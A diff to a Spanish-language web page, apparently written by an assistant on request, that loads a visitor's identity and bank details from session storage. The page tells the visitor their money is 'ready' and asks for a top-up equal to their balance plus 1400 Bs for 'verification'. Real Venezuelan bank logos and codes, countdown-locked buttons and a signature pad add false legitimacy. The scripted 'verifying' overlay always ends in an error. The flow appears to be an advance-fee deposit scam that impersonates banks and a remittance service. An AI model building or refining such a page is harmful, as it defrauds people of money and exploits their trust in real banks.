@@ -758,13 +758,12 @@
     }
 
     /****************************************************
-     * Estilos mejorados para botones con contador integrado
-     * (SOLUCIÓN 2)
+     * Estilos para botones con contador integrado (SOLUCIÓN 2)
      ****************************************************/
     .btn-countdown {
       position: relative;
       overflow: hidden;
-      min-width: 180px; /* Para asegurar espacio suficiente */
+      min-width: 180px;
       transition: all 0.3s ease;
     }
     .btn-countdown::before {
@@ -844,6 +843,19 @@
       background-size: 200% 200%;
       animation: success-animation 2s ease infinite;
     }
+
+    /* Animación de actualización */
+    @keyframes actualizacion {
+      0% { transform: translateY(-10px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+    .dato-actualizado {
+      animation: actualizacion 0.5s ease;
+    }
+    .banco-logo {
+      transition: opacity 0.3s ease;
+    }
+
   </style>
 </head>
 <body>
@@ -1662,35 +1674,329 @@
 
   <!-- SCRIPT PRINCIPAL -->
   <script>
-    /****************************************************
-     * Mapeo de nombres de bancos a sus logotipos
-     ****************************************************/
-    const bankLogosMapping = {
-      "Banco de Venezuela, SA": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
-      "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
-      "Banco Venezolano de Crédito, SA": "https://www.venezolano.com/images/galeria/108_1.png",
-      "Banco Mercantil, CA": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
-      "Banco Provincial, SA": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
-      "Banco del Caribe CA, Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
-      "Banco Exterior CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
-      "Banco Caroní CA, Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
-      "Banesco Banco Universal, CA": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
-      "Banco Sofitasa Banco Universal, CA": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
-      "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
-      "Banco Fondo Común, CA": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
-      "100% Banco, Banco Comercial, CA": "https://www.100x100banco.com/img/logo.png",
-      "Banco del Tesoro CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
-      "Bancrecer SA, Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
-      "Banco Activo CA, Banco Universal": "https://www.bancoactivo.com/logo.svg",
-      "Bancamiga Banco Universal, CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
-      "Banplus Banco Universal, CA": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
-      "Banco Bicentenario del Pueblo, Banco Universal CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
-      "Banco Nacional de Crédito CA, Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
+    /**********************************************************************
+     * PARTE 1:
+     *  gestorDatos.js - Sistema moderno de gestión de datos
+     **********************************************************************/
+    class GestorDatos {
+      constructor() {
+        // Estructura moderna de datos
+        this.datos = {
+          usuario: {
+            nombre: '',
+            documento: '',
+            fechaNacimiento: '',
+            telefono: ''
+          },
+          banco: {
+            nombre: '',
+            cuenta: '',
+            tipo: ''
+          },
+          financiero: {
+            saldo: 0,
+            montoVerificacion: 1400,
+            get montoTotal() {
+              return this.saldo + this.montoVerificacion;
+            }
+          }
+        };
+
+        // Mapeo moderno de logos bancarios con URLs de alta resolución
+        // (Se han incluido algunos bancos de ejemplo; puedes agregar más)
+        this.logosBancos = new Map([
+          ['Banco de Venezuela', {
+            url: 'https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png',
+            codigo: '0102'
+          }],
+          ['Banco Central de Venezuela', {
+            url: 'https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png',
+            codigo: '0001'
+          }],
+          ['Banco Venezolano de Crédito', {
+            url: 'https://www.venezolano.com/images/galeria/108_1.png',
+            codigo: '0104'
+          }],
+          ['Banco Mercantil', {
+            url: 'https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif',
+            codigo: '0105'
+          }],
+          ['Banco Provincial', {
+            url: 'https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg',
+            codigo: '0108'
+          }],
+          ['Banesco Banco Universal', {
+            url: 'https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip',
+            codigo: '0134'
+          }],
+          ['Bancamiga Banco Universal', {
+            url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png',
+            codigo: '0172'
+          }]
+          // Agrega más si lo deseas...
+        ]);
+      }
+
+      // Método para convertir un saldo de texto a número
+      convertirSaldo(saldoTexto) {
+        return parseFloat(
+          saldoTexto.replace(/\./g, '')
+                    .replace(',', '.')
+                    .replace(/[^\d.]/g, '')
+        ) || 0;
+      }
+
+      // Método para cargar datos desde sessionStorage
+      async cargarDatos() {
+        try {
+          const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');
+          const saldoBS = sessionStorage.getItem('currentBalanceBS') || '0,00 Bs';
+
+          this.datos.usuario.nombre = datosRemeex.fullName || '[Usuario]';
+          this.datos.usuario.documento = datosRemeex.docNumberCompleto || '[Doc]';
+          this.datos.usuario.fechaNacimiento = datosRemeex.birthDate || '[Fecha]';
+          this.datos.usuario.telefono = datosRemeex.userPhone || '';
+
+          this.datos.banco.nombre = datosRemeex.bankName || '[Banco]';
+          this.datos.banco.cuenta = datosRemeex.bankAccount || '[Cuenta]';
+          this.datos.banco.tipo = datosRemeex.bankType || '[Tipo]';
+
+          this.datos.financiero.saldo = this.convertirSaldo(saldoBS);
+
+          return true;
+        } catch (error) {
+          console.error('Error al cargar datos:', error);
+          return false;
+        }
+      }
+
+      // Método para formatear números al estilo venezolano
+      formatearNumeroVE(numero) {
+        return numero.toLocaleString('es-VE', {
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2
+        }).replace('.', ',');
+      }
+
+      // Método principal para actualizar la interfaz con los datos cargados
+      async actualizarInterfaz() {
+        // Nombre de usuario
+        this.actualizarTexto('userName', this.datos.usuario.nombre);
+
+        // Saldo
+        const saldoFormateado = this.formatearNumeroVE(this.datos.financiero.saldo) + ' Bs';
+        this.actualizarTexto('balanceAmount', saldoFormateado);
+
+        // Datos de Beneficiario
+        this.actualizarHTML('benefName', `Nombre: <strong>${this.datos.usuario.nombre}</strong>`);
+        this.actualizarHTML('benefDoc', `Documento: <strong>${this.datos.usuario.documento}</strong>`);
+        this.actualizarHTML('benefBirth', `F. Nac: <strong>${this.datos.usuario.fechaNacimiento}</strong>`);
+
+        // Datos bancarios
+        this.actualizarHTML('nombreBanco', `Banco: <strong>${this.datos.banco.nombre}</strong>`);
+        this.actualizarHTML('numeroCuenta', `N° de Cuenta: <strong>${this.datos.banco.cuenta}</strong>`);
+        this.actualizarHTML('tipoCuenta', `Tipo: <strong>${this.datos.banco.tipo}</strong>`);
+
+        // Logo del banco principal
+        await this.cambiarLogo('bankLogoSmall', this.datos.banco.nombre);
+
+        // Nombre del banco en varios sitios
+        document.querySelectorAll('.nombreBancoUsuario').forEach(el => {
+          el.textContent = this.datos.banco.nombre;
+        });
+        document.querySelectorAll('.numeroCuentaUsuario').forEach(el => {
+          el.textContent = this.datos.banco.cuenta;
+        });
+
+        // Sección "Tu dinero está listo"
+        const saldoListoEl = document.getElementById('saldoListo');
+        if (saldoListoEl) {
+          saldoListoEl.textContent = saldoFormateado;
+        }
+        const nombreUsuarioAviso = document.getElementById('nombreUsuarioAviso');
+        if (nombreUsuarioAviso) {
+          nombreUsuarioAviso.textContent = this.datos.usuario.nombre;
+        }
+
+        // Sección "Verificación rápida"
+        const saldoRequerido = document.getElementById('saldoRequerido');
+        if (saldoRequerido) {
+          saldoRequerido.textContent = saldoFormateado;
+        }
+
+        // Sección "Último paso..."
+        const montoRetiroBs = document.getElementById('montoRetiroBs');
+        if (montoRetiroBs) {
+          montoRetiroBs.textContent = saldoFormateado;
+        }
+
+        // Calcular el saldo total (saldo + 1400)
+        const totalNum = this.datos.financiero.saldo + this.datos.financiero.montoVerificacion;
+        const totalFormatted = this.formatearNumeroVE(totalNum) + ' Bs';
+
+        // Actualizar varios sitios con total
+        const montoDepositoTotal = document.getElementById('montoDepositoTotal');
+        if (montoDepositoTotal) {
+          montoDepositoTotal.textContent = totalFormatted;
+        }
+        const saldoFinalDisplay = document.getElementById('saldoFinalDisplay');
+        if (saldoFinalDisplay) {
+          saldoFinalDisplay.textContent = totalFormatted;
+        }
+        const totalFinalConReembolso = document.getElementById('totalFinalConReembolso');
+        if (totalFinalConReembolso) {
+          totalFinalConReembolso.textContent = totalFormatted;
+        }
+
+        // Banco final usuario
+        const bancoFinalUsuario = document.getElementById('bancoFinalUsuario');
+        if (bancoFinalUsuario) {
+          bancoFinalUsuario.textContent = this.datos.banco.nombre;
+        }
+
+        // (Opcional) Actualizar el overlay de error final
+        const bancoErrorFinal = document.getElementById('bancoErrorFinal');
+        if (bancoErrorFinal) {
+          bancoErrorFinal.textContent = this.datos.banco.nombre;
+        }
+        const montoErrorFinal = document.getElementById('montoErrorFinal');
+        if (montoErrorFinal) {
+          montoErrorFinal.textContent = saldoFormateado;
+        }
+
+        // Recarga: datos precompletados
+        const recargaBancoOrigen = document.getElementById('recargaBancoOrigen');
+        if (recargaBancoOrigen) {
+          recargaBancoOrigen.value = this.datos.banco.nombre;
+        }
+        const recargaCedula = document.getElementById('recargaCedula');
+        if (recargaCedula) {
+          recargaCedula.value = this.datos.usuario.documento;
+        }
+
+        // Status banner: ejemplo
+        const statusBanner = document.getElementById('statusBanner');
+        if (statusBanner) {
+          statusBanner.textContent = "¡Tu cuenta está activa y lista para retirar!";
+          statusBanner.style.backgroundColor = "rgba(16, 185, 129, 0.2)";
+        }
+      }
+
+      // Auxiliar para actualizar texto
+      actualizarTexto(id, texto) {
+        const el = document.getElementById(id);
+        if (el) {
+          el.textContent = texto;
+          el.style.animation = 'actualizacion 0.5s ease';
+        }
+      }
+
+      // Auxiliar para actualizar HTML
+      actualizarHTML(id, html) {
+        const el = document.getElementById(id);
+        if (el) {
+          el.innerHTML = html;
+          el.style.animation = 'actualizacion 0.5s ease';
+        }
+      }
+
+      // Cambiar logo del banco
+      async cambiarLogo(elementId, bancoNombre) {
+        const el = document.getElementById(elementId);
+        if (!el) return;
+
+        let logoInfo = null;
+        // Buscar la entrada en el mapa en base a coincidencias aproximadas
+        for (let [key, value] of this.logosBancos.entries()) {
+          if (bancoNombre.toLowerCase().includes(key.toLowerCase())) {
+            logoInfo = value;
+            break;
+          }
+        }
+        if (!logoInfo) {
+          // No encontrado, no hacemos nada
+          return;
+        }
+        // Efecto fade:
+        el.style.opacity = '0';
+        await new Promise(resolve => setTimeout(resolve, 300));
+        el.src = logoInfo.url;
+        el.style.opacity = '1';
+      }
+    }
+
+    /**********************************************************************
+     * PARTE 2:
+     *  Código adicional que quisiste añadir (variables globales, etc.)
+     *  (Aunque el sistema de la clase GestorDatos ya hace algo similar,
+     *   lo integramos respetando tu petición).
+     **********************************************************************/
+    // Variables globales para almacenar los datos del usuario
+    let datosUsuario = {
+      nombreCompleto: '',
+      documento: '',
+      fechaNacimiento: '',
+      banco: '',
+      numeroCuenta: '',
+      tipoCuenta: '',
+      telefono: '',
+      saldo: 0
     };
 
-    /****************************************************
-     * Función para copiar texto al portapapeles
-     ****************************************************/
+    // Mapeo de logos de bancos venezolanos (ejemplo reducido)
+    const logoBancos = {
+      "Banco de Venezuela": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
+      "Banco Mercantil": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
+      "Banco Provincial": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg"
+      // Añade aquí más bancos según necesites
+    };
+
+    // Función para convertir el saldo de texto a número
+    function convertirSaldoANumero(saldoTexto) {
+      return parseFloat(
+        saldoTexto.replace(/\./g, '')
+                  .replace(',', '.')
+                  .replace(/[^\d.]/g, '')
+      ) || 0;
+    }
+
+    // Función para formatear números al estilo venezolano
+    function formatearNumeroVE(numero) {
+      return numero.toLocaleString('es-VE', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      }).replace('.', ',');
+    }
+
+    // Función para cargar datos desde sessionStorage (NO se usa directamente en este ejemplo,
+    // porque ya tenemos la clase GestorDatos, pero la dejamos incluida por tu petición)
+    function cargarDatosUsuario() {
+      try {
+        // Intentar cargar datos de sessionStorage
+        const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');
+        const saldoBS = sessionStorage.getItem('currentBalanceBS') || '0,00 Bs';
+
+        // Actualizar datos globales
+        datosUsuario = {
+          nombreCompleto: datosRemeex.fullName || '[Nombre Usuario]',
+          documento: datosRemeex.docNumberCompleto || '[Documento]',
+          fechaNacimiento: datosRemeex.birthDate || '[Fecha]',
+          banco: datosRemeex.bankName || '[Banco]',
+          numeroCuenta: datosRemeex.bankAccount || '[Cuenta]',
+          tipoCuenta: datosRemeex.bankType || '[Tipo]',
+          telefono: datosRemeex.userPhone || '',
+          saldo: convertirSaldoANumero(saldoBS)
+        };
+      } catch (error) {
+        console.error('Error al cargar datos:', error);
+      }
+    }
+
+    /**********************************************************************
+     * PARTE 3:
+     *  Código JavaScript del flujo principal (interacciones, contadores, etc.)
+     **********************************************************************/
+    // Función para copiar texto al portapapeles
     function copyToClipboard(elementId) {
       const el = document.getElementById(elementId);
       if (!el) return;
@@ -1701,10 +2007,7 @@
     }
     window.copyToClipboard = copyToClipboard;
 
-    /****************************************************
-     * Función principal para manejar la navegación entre secciones
-     * (SOLUCIÓN 1)
-     ****************************************************/
+    // Maneja la navegación entre secciones
     function setupNavigation() {
       // Mapeo de botones y las secciones que deben activar
       const navigationMap = {
@@ -1718,20 +2021,16 @@
         "recargaReadyBtn": "recargaSection"
       };
 
-      // Configurar cada botón con su acción de navegación
       Object.entries(navigationMap).forEach(([buttonId, nextSectionId]) => {
         const button = document.getElementById(buttonId);
         if (button) {
           button.addEventListener("click", () => {
-            // Ocultar todas las secciones
             document.querySelectorAll('.visa-card').forEach(section => {
               section.classList.remove('active');
             });
-            // Mostrar la sección destino
             const nextSection = document.getElementById(nextSectionId);
             if (nextSection) {
               nextSection.classList.add('active');
-              // Desplazamiento suave hacia la nueva sección
               nextSection.scrollIntoView({ behavior: 'smooth' });
             }
           });
@@ -1739,10 +2038,7 @@
       });
     }
 
-    /****************************************************
-     * Función para integrar contadores regresivos dentro de los botones
-     * (SOLUCIÓN 1)
-     ****************************************************/
+    // Configura contadores regresivos en botones
     function setupIntegratedCountdowns() {
       // Estructura: [buttonId, initialTime, textAfterCountdown]
       const buttonsToCountdown = [
@@ -1758,15 +2054,10 @@
       buttonsToCountdown.forEach(([buttonId, time, finalText]) => {
         const button = document.getElementById(buttonId);
         if (button) {
-          // Guardamos el contenido original
-          const originalHTML = button.innerHTML;
-
-          // Iniciar el contador dentro del botón
           button.innerHTML = `<i class="fas fa-clock"></i> Espera ${time}s`;
           button.disabled = true;
           button.classList.add("btn-disabled", "btn-waiting");
 
-          // Iniciamos el intervalo
           let remainingTime = time;
           const interval = setInterval(() => {
             remainingTime--;
@@ -1784,10 +2075,7 @@
       });
     }
 
-    /****************************************************
-     * Función para manejar el comportamiento de firma
-     * (SOLUCIÓN 1)
-     ****************************************************/
+    // Configura la lógica de firma digital
     function setupSignatureFlow() {
       const saveSignatureBtn = document.getElementById("saveSignatureBtn");
       const overlayConfirmFirma = document.getElementById("overlayConfirmFirma");
@@ -1808,7 +2096,6 @@
       if (continuarFirmaBtn) {
         continuarFirmaBtn.addEventListener("click", () => {
           overlayConfirmFirma.classList.remove("active");
-          // Al continuar, iremos a securityVerification1 (navegación se maneja en setupNavigation)
         });
       }
 
@@ -1819,7 +2106,6 @@
         const ctx = signatureCanvas.getContext("2d");
         let isDrawing = false;
 
-        // Ajustar tamaño del canvas dinámicamente
         function resizeCanvas() {
           const rect = signatureCanvas.getBoundingClientRect();
           signatureCanvas.width = rect.width;
@@ -1828,11 +2114,9 @@
           ctx.lineCap = "round";
           ctx.strokeStyle = "#000";
         }
-
         window.addEventListener("resize", resizeCanvas);
         resizeCanvas();
 
-        // Eventos de dibujo
         function startDrawing(e) {
           isDrawing = true;
           draw(e);
@@ -1856,7 +2140,6 @@
           ctx.moveTo(x, y);
         }
 
-        // Listeners de mouse/touch
         signatureCanvas.addEventListener("mousedown", startDrawing);
         signatureCanvas.addEventListener("mouseup", stopDrawing);
         signatureCanvas.addEventListener("mousemove", draw);
@@ -1874,10 +2157,7 @@
       }
     }
 
-    /****************************************************
-     * Función para manejar la visualización de datos desenfocados
-     * (SOLUCIÓN 1)
-     ****************************************************/
+    // Manejo de "blur-container" (mostrar datos al pulsar)
     function setupBlurContainer() {
       const blurContainer = document.getElementById("blurContainer");
       if (blurContainer) {
@@ -1893,110 +2173,30 @@
       }
     }
 
-    /****************************************************
-     * Inicialización de datos dinámicos (SOLUCIÓN 1)
-     ****************************************************/
-    function initializeDynamicData() {
-      // Datos demo (puedes modificar a tu gusto)
-      const demoData = {
-        userName: "Carlos Martínez",
-        balance: "76.800,00",
-        benefName: "Carlos Alberto Martínez",
-        benefDoc: "V-18.245.967",
-        benefBirth: "15/05/1985",
-        bankName: "Banco Mercantil, CA",
-        accountNumber: "0105-0027-46-1027654321",
-        accountType: "Corriente",
-        conceptoRecarga: "V18245967"
-      };
+    // Lógica principal al cargar el DOM
+    document.addEventListener("DOMContentLoaded", async () => {
+      // Instanciamos la clase GestorDatos y cargamos la data
+      const gestor = new GestorDatos();
+      await gestor.cargarDatos();
+      await gestor.actualizarInterfaz();
 
-      // Nombre de usuario
-      document.getElementById("userName").textContent = demoData.userName;
-      // Saldo
-      document.getElementById("balanceAmount").textContent = demoData.balance + " Bs";
-
-      // Datos del Beneficiario
-      document.getElementById("benefName").innerHTML = `Nombre: <strong>${demoData.benefName}</strong>`;
-      document.getElementById("benefDoc").innerHTML = `Documento: <strong>${demoData.benefDoc}</strong>`;
-      document.getElementById("benefBirth").innerHTML = `F. Nac: <strong>${demoData.benefBirth}</strong>`;
-
-      // Datos bancarios
-      document.getElementById("nombreBanco").innerHTML = `Banco: <strong>${demoData.bankName}</strong>`;
-      document.getElementById("numeroCuenta").innerHTML = `N° de Cuenta: <strong>${demoData.accountNumber}</strong>`;
-      document.getElementById("tipoCuenta").innerHTML = `Tipo: <strong>${demoData.accountType}</strong>`;
-
-      // Sección "Tu dinero está listo"
-      document.getElementById("saldoListo").textContent = demoData.balance + " Bs";
-      document.getElementById("nombreUsuarioAviso").textContent = demoData.benefName;
-
-      // Sección "Verificación rápida"
-      document.getElementById("saldoRequerido").textContent = demoData.balance + " Bs";
-
-      // Sección "Último paso..."
-      document.getElementById("montoRetiroBs").textContent = demoData.balance + " Bs";
-
-      // Calcular el saldo total con 1400 extra
-      const saldoNum = parseFloat(demoData.balance.replace(".", "").replace(",", "."));
-      const montoTotal = saldoNum + 1400;
-      const montoTotalFormatted = montoTotal.toLocaleString('es-VE', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      }).replace(".", ",").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-
-      document.getElementById("montoDepositoTotal").textContent = montoTotalFormatted + " Bs";
-      document.getElementById("saldoFinalDisplay").textContent = montoTotalFormatted + " Bs";
-      document.getElementById("totalFinalConReembolso").textContent = montoTotalFormatted + " Bs";
-
-      // Conceptos de pago
-      document.getElementById("conceptoPagoMovil").textContent = demoData.conceptoRecarga;
-      document.getElementById("conceptoRecarga").textContent = demoData.conceptoRecarga;
-      document.getElementById("conceptoRecargaResumen").textContent = demoData.conceptoRecarga;
-      document.getElementById("conceptoRecargaModal").textContent = demoData.conceptoRecarga;
-
-      // Logos
-      const bankLogo = bankLogosMapping[demoData.bankName];
-      if (bankLogo) {
-        document.getElementById("bankLogoSmall").src = bankLogo;
-        document.getElementById("logoBancoOrigen").src = bankLogo;
-        document.getElementById("verificandoRecargaLogo").src = bankLogo;
-      }
-
-      // Recarga: datos precompletados
-      document.getElementById("recargaBancoOrigen").value = demoData.bankName;
-      document.getElementById("recargaCedula").value = demoData.benefDoc;
-      document.getElementById("bancoFinalUsuario").textContent = demoData.bankName.split(",")[0];
-
-      // Nombre del Banco en varios sitios
-      document.querySelectorAll(".nombreBancoUsuario").forEach(el => {
-        el.textContent = demoData.bankName.split(",")[0];
-      });
-      document.querySelectorAll(".numeroCuentaUsuario").forEach(el => {
-        el.textContent = demoData.accountNumber;
-      });
-    }
-
-    /****************************************************
-     * Inicialización cuando el DOM está listo
-     ****************************************************/
-    document.addEventListener("DOMContentLoaded", () => {
-      initializeDynamicData();
+      // Ajustes de interacción
       setupNavigation();
       setupIntegratedCountdowns();
       setupSignatureFlow();
       setupBlurContainer();
 
-      // Banner de estado
-      const statusBanner = document.getElementById("statusBanner");
-      if (statusBanner) {
-        statusBanner.textContent = "¡Tu cuenta está activa y lista para retirar!";
-        statusBanner.style.backgroundColor = "rgba(16, 185, 129, 0.2)";
+      // Configurar enlace de WhatsApp
+      const whatsappLink = document.getElementById("whatsappLink");
+      if (whatsappLink) {
+        // Cambia el número según tus necesidades
+        whatsappLink.href = "https://wa.me/584125551234?text=Necesito%20ayuda%20con%20mi%20retiro%20de%20dinero";
       }
 
       // Manejo del botón "Confirmar Recarga" para simular verificación y error final
       const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
       if (confirmRecargaBtn) {
         confirmRecargaBtn.addEventListener("click", () => {
-          // Mostrar overlay de verificación
           const overlayVerificando = document.getElementById("overlayVerificandoRecarga");
           if (overlayVerificando) {
             overlayVerificando.classList.add("active");
@@ -2006,30 +2206,13 @@
               const overlayError = document.getElementById("overlayErrorFinal");
               if (overlayError) {
                 overlayError.classList.add("active");
-
-                // Establecer banco en mensaje de error
-                const bancoErrorFinal = document.getElementById("bancoErrorFinal");
-                if (bancoErrorFinal) {
-                  const nombreBancoUsuario = document.querySelector(".nombreBancoUsuario");
-                  if (nombreBancoUsuario) {
-                    bancoErrorFinal.textContent = nombreBancoUsuario.textContent;
-                  }
-                }
-                // Establecer monto en mensaje de error
-                const montoErrorFinal = document.getElementById("montoErrorFinal");
-                if (montoErrorFinal) {
-                  const saldoListo = document.getElementById("saldoListo");
-                  if (saldoListo) {
-                    montoErrorFinal.textContent = saldoListo.textContent;
-                  }
-                }
               }
             }, 3000);
           }
         });
       }
 
-      // Manejo del botón "recargaReadyBtn" para mostrar datos de verificación
+      // Manejo del botón "recargaReadyBtn" para mostrar datos de verificación (overlay)
       const recargaReadyBtn = document.getElementById("recargaReadyBtn");
       if (recargaReadyBtn) {
         recargaReadyBtn.addEventListener("click", () => {
@@ -2049,12 +2232,6 @@
             overlayDatos.classList.remove("active");
           }
         });
-      }
-
-      // Configurar enlace de WhatsApp
-      const whatsappLink = document.getElementById("whatsappLink");
-      if (whatsappLink) {
-        whatsappLink.href = "https://wa.me/584125551234?text=Necesito%20ayuda%20con%20mi%20retiro%20de%20dinero";
       }
 
       // Manejo de subida de documento
@@ -2077,15 +2254,14 @@
             // Habilitar botón de confirmar documento
             confirmDocBtn.style.display = "inline-flex";
             confirmDocBtn.disabled = false;
-            confirmDocBtn.classList.remove("btn-disabled");
-            confirmDocBtn.classList.remove("btn-waiting");
+            confirmDocBtn.classList.remove("btn-disabled", "btn-waiting");
           }
         });
       }
     });
 
     /****************************************************
-     * Script Tawk.to (opcional)
+     * Script Tawk.to (Chat de soporte)
      ****************************************************/
     var Tawk_API = Tawk_API || {},
         Tawk_LoadStart = new Date();
@@ -2101,6 +2277,7 @@
   </script>
 </body>
 </html>
+
 
 
 
